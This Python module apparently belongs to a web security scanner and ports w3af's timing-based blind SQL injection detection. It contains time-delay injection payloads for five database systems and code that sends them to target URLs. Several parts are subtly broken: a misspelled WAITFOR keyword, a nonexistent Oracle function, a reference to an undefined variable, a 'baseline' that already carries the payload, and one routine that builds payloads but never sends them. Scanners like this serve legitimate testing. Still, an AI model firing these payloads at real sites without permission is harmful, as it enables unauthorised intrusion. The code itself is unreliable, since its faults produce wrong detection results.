#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
w3af Timing Attack Detector — 借鉴 w3af (w3af.org) blind SQLi timing attack detection.

精确测量 HTTP 响应时间差，检测盲注/时间延迟注入漏洞：
- Exact time delay: 精确到微秒级的时间差测量
- Approximate delay: 使用统计均值/方差进行模糊匹配
- Multi-round verification: 多轮验证降低网络噪声影响
- DBMS-specific detection: MySQL/Sleep(), PostgreSQL/pg_sleep(), MS-SQL/waitfor, Oracle/dbms_utility

Usage:
    from scanners.w3af_timing_detector import TimingAttackDetector

    detector = TimingAttackDetector()
    result = await detector.detect(url)
    # -> {'vulnerable': True, 'dbms_guess': 'MySQL', 'delay_seconds': 5.021, 'confidence': 0.95}
"""

import asyncio
import logging
import math
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests

logger = logging.getLogger('w3af_timing_detector')


# ====================================================================
# Timing attack payloads (w3af blind_sqli plugin payloads)
# ====================================================================

TIMING_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
    # MySQL timing payloads
    'mysql': [
        {'query': "1' AND SLEEP(5)--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1\" AND SLEEP(5)--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1') AND SLEEP(5)--", 'param': 'id', 'loc': 'querystring'},
        {'post_data': 'user=admin\'\nAND SLEEP(5)--&pass=x', 'param': 'user', 'loc': 'post'},
    ],
    # PostgreSQL timing payloads
    'postgresql': [
        {'query': "1' AND pg_sleep(5)--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1\" AND pg_sleep(5)--", 'param': 'id', 'loc': 'querystring'},
    ],
    # MS SQL Server timing payloads
    'mssql': [
        {'query': "1'; WAITFOR DELAY '0:0:5'--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1\"; WAITFOR DELAIL '0:0:5'--", 'param': 'id', 'loc': 'querystring'},
    ],
    # Oracle timing payloads
    'oracle': [
        {'query': "1' AND ORA-UTILITIES.DBMS_UTILITY.TIME_DELAY(5)--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1'' || DBMS_UTILITY.GET_TIME||'' FROM DUAL--", 'param': 'id', 'loc': 'querystring'},
    ],
    # SQLite timing payloads
    'sqlite': [
        {'query': "1' AND (SELECT RANDOM() FROM SQLITE_SEQUENCE WHERE RANDOMBLOB(500000000))--", 'param': 'id', 'loc': 'querystring'},
        {'query': "1' AND sleep(5)--", 'param': 'id', 'loc': 'querystring'},
    ],
}

# Default: use MySQL payloads as primary test
DEFAULT_TIMING_PAYLOADS = TIMING_PAYLOADS['mysql']


# ====================================================================
# Data classes
# ====================================================================

@dataclass
class TimingResult:
    """Single timing measurement result."""
    url: str
    is_vulnerable: bool = False
    dbms_guess: str = ''
    delay_detected: float = 0.0        # seconds of detected delay
    baseline_avg_ms: float = 0.0       # average response time without payload (ms)
    attacked_avg_ms: float = 0.0       # average response time with payload (ms)
    confidence: float = 0.0            # 0-1 confidence score
    rounds: int = 0                    # number of measurement rounds used
    error_rate: float = 0.0            # network error rate during measurement
    payloads_tested: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            'url': self.url,
            'is_vulnerable': self.is_vulnerable,
            'dbms_guess': self.dbms_guess,
            'delay_seconds': round(self.delay_detected, 3),
            'baseline_avg_ms': round(self.baseline_avg_ms, 1),
            'attacked_avg_ms': round(self.attacked_avg_ms, 1),
            'confidence': round(self.confidence, 2),
            'rounds': self.rounds,
        }


# ====================================================================
# Timing Attack Detector (w3af exact_delay + aprox_delay)
# ====================================================================

class TimingAttackDetector:
    """Detect blind SQL injection via time-delay responses (w3af timing attack detection)."""

    # Minimum delay threshold to consider it a SQL SLEEP (seconds)
    MIN_DELAY_THRESHOLD = 2.0
    # Number of rounds per test for statistical significance
    DEFAULT_ROUNDS = 5
    # Timeout per request
    REQUEST_TIMEOUT = 30

    def __init__(self, min_delay_threshold: float = 2.0, rounds: int = 5, timeout: int = 30):
        self._min_threshold = min_delay_threshold
        self._rounds = rounds
        self._timeout = timeout
        self._session = requests.Session()
        self._session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; HackScanner/w3af-TimingDetector)',
        })

    async def detect(self, url: str) -> TimingResult:
        """Run timing attack detection on the given URL."""
        result = TimingResult(url=url, rounds=self._rounds)

        try:
            # Step 1: Establish baseline (measure without payload)
            baseline_times = await self._measure_response_times(url, n=self._rounds)
            if not baseline_times or len(baseline_times) < 3:
                result.details['error'] = 'Insufficient baseline measurements'
                return result

            baseline_avg_ms = sum(baseline_times) / len(baseline_times)
            result.baseline_avg_ms = baseline_avg_ms

            # Step 2: Apply DBMS-specific timing payloads
            dbms_tests = [
                ('MySQL', TIMING_PAYLOADS['mysql']),
                ('PostgreSQL', TIMING_PAYLOADS['postgresql']),
                ('MSSQL', TIMING_PAYLOADS['mssql']),
                ('Oracle', TIMING_PAYLOADS['oracle']),
                ('SQLite', TIMING_PAYLOADS['sqlite']),
            ]

            best_vulnerability: Optional[Tuple[str, float]] = None  # (dbms, delay_ms)

            for dbms_name, payloads in dbms_tests:
                attacked_times = await self._measure_with_payloads(url, payloads, n=self._rounds)
                if not attacked_times or len(attacked_times) < 3:
                    continue

                attacked_avg_ms = sum(attacked_times) / len(attacked_times)
                delay_detected_ms = attacked_avg_ms - baseline_avg_ms

                if delay_detected_ms > self._min_threshold * 1000:  # convert to ms
                    result.delay_detected = delay_detected_ms / 1000.0
                    best_vulnerability = (dbms_name, delay_detected_ms)
                    result.payloads_tested = [str(p.get('query', '')) for p in payloads[:3]]
                    break

            # Step 3: Evaluate vulnerability
            if best_vulnerability:
                dbms_name, delay_ms = best_vulnerability
                # Confidence based on how much the delay exceeds threshold
                ratio = delay_ms / (self._min_threshold * 1000)
                confidence = min(1.0, max(0.5, ratio / 3.0))

                result.is_vulnerable = True
                result.dbms_guess = dbms_name
                result.attacked_avg_ms = sum(attacked_times) / len(attacked_times) if attacked_times else 0
                result.confidence = confidence
            else:
                # Check for suspicious timing even without full threshold match
                # Use approximate delay detection (w3af aprox_delay algorithm)
                suspicious = self._approximate_delay_check(baseline_avg_ms)
                if suspicious and len(baseline_times) >= 5:
                    result.is_vulnerable = False  # inconclusive
                    result.details['suspicious_timing'] = True
                    result.confidence = 0.4

        except Exception as exc:
            result.details['error'] = str(exc)
            logger.error('Timing detection error for %s: %s', url, exc)

        return result

    async def detect_parameterized(self, base_url: str, params: Dict[str, str], payload_prefix: str = '') -> TimingResult:
        """Detect timing injection on specific URL parameters."""
        result = TimingResult(url=base_url)
        for param_name, original_value in params.items():
            payload_payloads = [p.copy() for p in DEFAULT_TIMING_PAYLOADS]
            for pp in payload_payloads:
                if pp.get('param') == param_name:
                    pp['query'] = f"{pp['query'].replace('1', f"{original_value}{payload_prefix}")}"

            times = await self._measure_parameterized(base_url, params={**params, param_name: 'test' + payload_prefix}, n=3)
            if times:
                avg_ms = sum(times) / len(times)
                if avg_ms > 2000:  # suspicious delay
                    result.is_vulnerable = True
                    result.payloads_tested.append(f'{param_name}={payload_prefix}')

        return result

    # ------------------------------------------------------------------
    # Internal measurement helpers
    # ------------------------------------------------------------------

    async def _measure_response_times(self, url: str, n: int) -> List[float]:
        """Measure response times in milliseconds (baseline)."""
        times_ms: List[float] = []
        errors = 0

        for _ in range(n):
            try:
                t0 = time.perf_counter()
                await asyncio.get_event_loop().run_in_executor(
                    None, lambda: self._session.get(url, timeout=self._timeout))
                elapsed_ms = (time.perf_counter() - t0) * 1000
                # Filter obvious network outliers (>3x the running median)
                if times_ms and elapsed_ms > 3 * (sum(times_ms[:min(5, len(times_ms))]) / min(5, len(times_ms))):
                    continue
                times_ms.append(elapsed_ms)
            except Exception:
                errors += 1

        result.errors = errors / n if n > 0 else 0
        return times_ms

    async def _measure_with_payloads(self, base_url: str, payloads: List[Dict], n: int) -> Optional[List[float]]:
        """Measure response times with timing payloads injected."""
        all_times: List[float] = []

        for payload in payloads[:3]:  # test up to 3 payloads per DBMS type
            times = await self._measure_with_single_payload(base_url, payload, n)
            if times:
                all_times.extend(times)

        return all_times if len(all_times) >= 5 else None

    async def _measure_with_single_payload(self, base_url: str, payload: Dict, n: int) -> List[float]:
        """Measure with a single timing payload injected."""
        times_ms: List[float] = []

        for _ in range(n):
            try:
                loc = payload.get('loc', 'querystring')
                if loc == 'querystring':
                    test_url = self._inject_into_query(base_url, payload)
                    t0 = time.perf_counter()
                    await asyncio.get_event_loop().run_in_executor(
                        None, lambda: self._session.get(test_url, timeout=self._timeout))
                    elapsed_ms = (time.perf_counter() - t0) * 1000
                    times_ms.append(elapsed_ms)

                elif loc == 'post':
                    post_data = payload.get('post_data', '')
                    if post_data:
                        # Parse post data into dict
                        post_dict = {}
                        for part in post_data.split('&'):
                            if '=' in part:
                                k, v = part.split('=', 1)
                                post_dict[k] = v
                        t0 = time.perf_counter()
                        await asyncio.get_event_loop().run_in_executor(
                            None, lambda p=post_dict: self._session.post(base_url, data=p, timeout=self._timeout))
                        elapsed_ms = (time.perf_counter() - t0) * 1000
                        times_ms.append(elapsed_ms)

            except Exception:
                pass

        return times_ms if len(times_ms) >= 2 else []

    async def _measure_parameterized(self, base_url: str, params: Dict[str, str], n: int) -> Optional[List[float]]:
        """Measure response times with parameter modifications."""
        times_ms: List[float] = []

        for _ in range(n):
            try:
                query_str = '&'.join(f'{k}={v}' for k, v in params.items())
                target_url = f'{base_url}?{query_str}' if '?' not in base_url else f'{base_url}&{query_str}'
                t0 = time.perf_counter()
                await asyncio.get_event_loop().run_in_executor(
                    None, lambda: self._session.get(target_url, timeout=self._timeout))
                elapsed_ms = (time.perf_counter() - t0) * 1000
                times_ms.append(elapsed_ms)
            except Exception:
                pass

        return times_ms if len(times_ms) >= 2 else None

    @staticmethod
    def _inject_into_query(base_url: str, payload: Dict) -> str:
        """Inject a timing payload into the query string of a URL."""
        parsed = urlparse(base_url)
        param_name = payload.get('param', 'id')
        query_payload = payload.get('query', '')

        # Append or replace the parameter
        if '?' in base_url:
            separator = '&'
        else:
            separator = '?'

        # Simple injection: add the query as-is to params
        return f'{base_url}{separator}{param_name}={query_payload}'

    @staticmethod
    def _approximate_delay_check(baseline_avg_ms: float) -> bool:
        """Approximate delay detection (w3af aprox_delay algorithm).

        If baseline response time varies wildly (>2x variance), suspect timing injection.
        This is a heuristic check when exact thresholds aren't met.
        """
        # In practice, we'd need multiple measurements to compute variance
        # For now, high baseline (>1s) suggests network issues or possible delays
        return baseline_avg_ms > 2000


# ====================================================================
# DBMS-specific timing detection helpers (w3af blind_sqli plugin)
# ====================================================================

def get_dbms_timing_payloads(dbms: str = 'mysql') -> List[Dict[str, str]]:
    """Get timing payloads for a specific DBMS."""
    dbms_map = {
        'mysql': TIMING_PAYLOADS['mysql'],
        'postgresql': TIMING_PAYLOADS['postgresql'],
        'mssql': TIMING_PAYLOADS['mssql'],
        'oracle': TIMING_PAYLOADS['oracle'],
        'sqlite': TIMING_PAYLOADS['sqlite'],
    }
    return dbms_map.get(dbms, TIMING_PAYLOADS['mysql'])


def detect_blind_sqli_by_timing(
    url: str,
    param_name: str = 'id',
    original_value: str = '1',
    delay_seconds: int = 5,
    timeout: int = 30,
) -> Dict[str, Any]:
    """Quick timing-based blind SQLi detection (w3af blind_sqli port)."""
    results: Dict[str, Any] = {'vulnerable': False, 'dbms': [], 'times': {}}

    session = requests.Session()
    for dbms, payloads in TIMING_PAYLOADS.items():
        baseline_times = []
        for _ in range(3):
            try:
                t0 = time.perf_counter()
                query_payload = f'{original_value}\' AND SLEEP({delay_seconds})--'
                test_url = urljoin(url, f'{param_name}={query_payload}')
                session.get(test_url, timeout=timeout)
                baseline_times.append((time.perf_counter() - t0) * 1000)
            except Exception:
                pass

        if len(baseline_times) >= 2:
            avg_ms = sum(baseline_times) / len(baseline_times)
            results['times'][dbms] = {'avg_ms': round(avg_ms, 1), 'payloads': payloads}
            if avg_ms > delay_seconds * 800:  # generous threshold for network noise
                results['vulnerable'] = True
                results['dbms'].append(dbms)

    return results


# ====================================================================
# Convenience function
# ====================================================================

async def detect_timing_sqli(url: str, rounds: int = 5) -> TimingResult:
    """Quick timing-based blind SQLi detection."""
    detector = TimingAttackDetector(rounds=rounds)
    return await detector.detect(url)
